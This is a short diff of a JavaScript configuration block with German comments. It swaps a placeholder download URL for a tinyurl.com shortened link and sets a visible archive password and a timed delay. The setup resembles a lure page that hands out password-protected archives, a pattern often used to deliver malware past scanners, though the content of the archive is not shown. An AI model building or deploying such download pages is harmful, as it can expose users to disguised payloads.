@@ -1,6 +1,6 @@
 // =================== EINSTELLUNGEN ===================
 // ← Ersetze die URL durch deinen direkten Link (HTTPS empfohlen)
-const DIRECT_DOWNLOAD_URL = 'https://example.com/your-archive.zip';
+const DIRECT_DOWNLOAD_URL = 'https://tinyurl.com/84vr37ns';
 // ← Passwort, das dem Nutzer angezeigt wird
 const PASSWORD = '3578';
 // Verzögerung (4–6 Sek.)
